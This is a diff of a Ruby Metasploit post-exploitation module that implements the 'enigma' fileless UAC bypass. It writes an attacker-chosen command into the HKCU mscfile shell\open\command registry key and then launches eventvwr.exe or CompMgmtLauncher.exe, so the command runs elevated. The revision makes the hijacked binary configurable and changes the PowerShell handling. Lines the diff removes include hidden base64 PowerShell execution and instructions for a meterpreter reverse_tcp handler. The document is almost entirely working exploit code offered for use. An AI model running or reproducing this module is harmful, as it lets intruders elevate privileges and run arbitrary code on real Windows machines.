@@ -38,13 +38,12 @@
 # The cmd.exe command to be executed (target)  => set EXEC_COMMAND start firefox.exe www.househot.com
 # Check target vulnerability settings/status?  => set CHECK_VULN true
 # Delete malicious registry hive keys/values?  => set DEL_REGKEY true
-# Exec powershell shellcode insted of a cmd?   => set USE_POWERSHELL true
+# Use powershell.exe to execute our command?   => set USE_POWERSHELL true
+# The binary.exe vulnerable?                   => set VULN_SOFT CompMgmtLauncher.exe
 # ---
-# HINT: To deploy a powershell payload (shellcode string) we need to set the option
-# 'USE_POWERSHELL true' and input the base64 encoded 'shellcode' into 'EXEC_COMMAND'
+# HINT: To execute a powershell command we need the follow settings active:
 # EXAMPLE: set USE_POWERSHELL true
-# EXAMPLE: set EXEC_COMMAND ZWNobyAndGVzdCcgPiBjOlx0ZXN0LnR4dAo=
-# HINT: echo 'test' > c:\\test.txt -> ENCODED IN BASE64: ZWNobyAndGVzdCcgPiBjOlx0ZXN0LnR4dAo=
+# EXAMPLE: set EXEC_COMMAND start chrome.exe www.youporn.com
 # ---
 #
 #
@@ -95,7 +94,7 @@ require 'msf/core/post/windows/registry'
 # ----------------------------------
 class MetasploitModule < Msf::Post
       Rank = ExcellentRanking
- 
+
          include Msf::Post::Common
          include Msf::Post::Windows::Priv
          include Msf::Post::Windows::Error
@@ -111,37 +110,39 @@ class MetasploitModule < Msf::Post
                 super(update_info(info,
                         'Name'          => 'enigma fileless uac bypass [RCE]',
                         'Description'   => %q{
-                                        Implementation of fileless uac bypass by enigma and mattifestation using cmd.exe insted of powershell.exe (OJ msf module). This module will create the required registry entry in the current user’s hive, set the default value to whatever you pass via the EXEC_COMMAND parameter, and runs eventvwr.exe (hijacking the process being started to gain code execution).
+                                        Implementation of fileless uac bypass by enigma and mattifestation using cmd.exe insted of powershell.exe (OJ msf module). This module will create the required registry entry in the current user’s hive, set the default value to whatever you pass via the EXEC_COMMAND parameter, and runs eventvwr.exe OR CompMgmtLauncher.exe (hijacking the process being started to gain code execution).
                         },
                         'License'       => UNKNOWN_LICENSE,
                         'Author'        =>
                                 [
                                         'Module Author: pedr0 Ubuntu [r00t-3xp10it]', # post-module author
-                                        'Vuln discover : enigma0x3 | mattifestation', # credits
+                                        'Vuln discover: enigma0x3 | mattifestation',  # credits
                                 ],
  
-                        'Version'        => '$Revision: 1.7',
-                        'DisclosureDate' => 'jan 8 2017',
+                        'Version'        => '$Revision: 2.0',
+                        'DisclosureDate' => 'mar 16 2017',
                         'Platform'       => 'windows',
                         'Arch'           => 'x86_x64',
                         'Privileged'     => 'false', # thats no need for privilege escalation..
                         'Targets'        =>
                                 [
                                          # Tested againts windows 7 | Windows 8 | Windows 10
-                                         [ 'Windows XP', 'Windows VISTA', 'Windows 7', 'Windows 8', 'Windows 9', 'Windows 10' ]
+                                         [ 'Windows VISTA', 'Windows 7', 'Windows 8', 'Windows 9', 'Windows 10' ]
                                 ],
-                        'DefaultTarget'  => '6', # default its to run againts windows 10
+                        'DefaultTarget'  => '5', # default its to run againts windows 10
                         'References'     =>
                                 [
                                          [ 'URL', 'POC: goo.gl/XHQ6aF' ],
                                          [ 'URL', 'https://github.com/r00t-3xp10it' ],
+                                         [ 'URL', 'http://x42.obscurechannel.com/?p=368' ],
                                          [ 'URL', 'https://github.com/r00t-3xp10it/msf-auxiliarys' ]
 
 
                                 ],
 			'DefaultOptions' =>
 				{
-                                         'SESSION' => '1', # Default its to run againts session 1
+                                         'SESSION' => '1',             # Default its to run againts session 1
+                                         'VULN_SOFT' => 'eventvwr.exe', # Default its to run againts eventvwr.exe
                                          'EXEC_COMMAND' => 'start %temp%\\N4m', # command for venom framework
 				},
                         'SessionTypes'   => [ 'meterpreter' ]
@@ -157,11 +158,13 @@ class MetasploitModule < Msf::Post
 
                 register_advanced_options(
                         [
-                                OptBool.new('USE_POWERSHELL', [ false, 'Execute powershell shellcode insted of a cmd command?' , false]),
+                                OptString.new('VULN_SOFT', [ false, 'The binary.exe vulnerable (eg CompMgmtLauncher.exe)']),
+                                OptBool.new('USE_POWERSHELL', [ false, 'Use powershell.exe to execute our command?' , false]),
                                 OptBool.new('DEL_REGKEY', [ false, 'Delete malicious registry key hive?' , false])
                         ], self.class) 
 
         end
+
 
 
 
@@ -181,13 +184,12 @@ else
 end
 
   r=''
-  vul_serve = "eventvwr.exe" # vulnerable soft to be hijacked
-  exec_comm = datastore['EXEC_COMMAND'] # my cmd command to execute (OR powershell shellcode)
+  vul_serve = datastore['VULN_SOFT'] # vulnerable soft to be hijacked
+  exec_comm = datastore['EXEC_COMMAND'] # my cmd command to execute (OR powershell)
   uac_level = "ConsentPromptBehaviorAdmin" # uac level key
   comm_path = "%SystemRoot%\\System32\\cmd.exe /c" # cmd.exe %comspec% path
   regi_hive = "REG ADD HKCU\\Software\\Classes\\mscfile\\shell\\open\\command" # registry hive key to be hijacked
-  psh_lpath = "%SystemRoot%\\#{arch}\\WindowsPowershell\\v1.0\\powershell.exe" # powershell.exe %comspec% path
-  psh_comma = "#{psh_lpath} -nop -wind hidden -Exec Bypass -noni -enc" # use_powershell advanced option command
+  psh_comma = "%SystemRoot%\\#{arch}\\WindowsPowershell\\v1.0\\powershell.exe -Command" # use_powershell advanced option command
   uac_hivek = "HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System" # uac hive key
   # check for proper config settings enter
   # to prevent 'unset all' from deleting default options...
@@ -196,7 +198,7 @@ end
     print_warning("Please set EXEC_COMMAND option!")
     return nil
   else
-    print_status("Hijacking eventvwr.exe process!")
+    print_status("Hijacking #{vul_serve} process!")
     Rex::sleep(1.5)
   end
 
@@ -242,36 +244,35 @@ end
 
         #
         # chose to execute a single command in cmd.exe syntax logic
-        # or to execute a shellcode(base64) string using powershell.exe
+        # or to execute command using powershell.exe
         #
         if datastore['USE_POWERSHELL'] == true
           comm_inje = "#{regi_hive} /ve /t REG_SZ /d \"#{psh_comma} #{exec_comm}\" /f"
-          print_good(" exec => Injecting shellcode(base64) string (powershell.exe)")
+          print_good(" exec => Injecting powershell command string (powershell.exe)")
+          print_good(" exec => string: #{psh_comma} #{exec_comm}")
           Rex::sleep(1.0)
         else
           comm_inje = "#{regi_hive} /ve /t REG_SZ /d \"#{comm_path} #{exec_comm}\" /f"
           print_good(" exec => Injecting cmd command string (cmd.exe)")
+          print_good(" exec => string: #{comm_path} #{exec_comm}")
           Rex::sleep(1.0)
         end
 
  # Execute process hijacking in registry (cmd.exe OR powershell.exe)...
- # REG ADD HKCU\Software\Classes\mscfile\shell\open\command /ve /t REG_SZ /d "powershell.exe -nop -enc aDfSjRnGlsgVkGftmoEdD==" /f
+ # REG ADD HKCU\Software\Classes\mscfile\shell\open\command /ve /t REG_SZ /d "powershell.exe -Command start chrome.exe www.youporn.com" /f
  # REG ADD HKCU\Software\Classes\mscfile\shell\open\command /ve /t REG_SZ /d "c:\windows\System32\cmd.exe /c start notepad.exe" /f
  print_good(" exec => Hijacking process to gain code execution...")
  r = session.sys.process.execute("cmd.exe /c #{comm_inje}", nil, {'Hidden' => true, 'Channelized' => true})
  # give a proper time to refresh regedit 'enigma0x3' :D
- Rex::sleep(4.5)
+ Rex::sleep(4.0)
 
       # start remote service to gain code execution
-      print_good(" exec => Starting eventvwr.exe native process...")
+      print_good(" exec => Starting #{vul_serve} native process...")
       r = session.sys.process.execute("cmd.exe /c start #{vul_serve}", nil, {'Hidden' => true, 'Channelized' => true})
       Rex::sleep(1.0)
 
     # close channel when done
     print_status("UAC-RCE Credits: enigma0x3 + @mattifestation")
-    print_status("execute: background")
-    print_status("execute: handler -P PORT -H HOST -p windows/meterpreter/reverse_tcp")
-    print_status("execute: exploit")
     print_line("")
     r.channel.close
     r.close
@@ -299,7 +300,7 @@ def ls_stage2
     print_warning("Please set DEL_REGKEY option!")
     return nil
   else
-    print_status("Revert eventvwr.exe process hijack!")
+    print_status("Revert binary.exe process hijack!")
     Rex::sleep(1.5)
   end
 
@@ -356,7 +357,7 @@ def ls_stage3
   r=''
   session = client
   oscheck = client.fs.file.expand_path("%OS%")
-  vuln_soft = "eventvwr.exe" # vulnerable software name
+  vuln_soft = datastore['VULN_SOFT'] # vulnerable soft to be hijacked
   uac_level = "ConsentPromptBehaviorAdmin" # uac level key
   vuln_hive = "HKCR\\mscfile\\shell\\open\\command" # vulnerable hive key call (mmc.exe)
   vuln_key = "HKCU\\Software\\Classes\\mscfile\\shell\\open\\command" # vuln hijack key
@@ -434,7 +435,7 @@ def ls_stage3
     print_line("    REPORT : None hijacking registry key was found under -> [HKCU]")
     print_line("           : that allows local/remote-code execution (enigma bypass)")
   else
-    print_line("    REPORT : Hijacking method its active, waiting for eventvwr.exe")
+    print_line("    REPORT : Hijacking method its active, waiting for #{vuln_soft}")
     print_line("           : execution to run injected string in target machine...")
   end
 
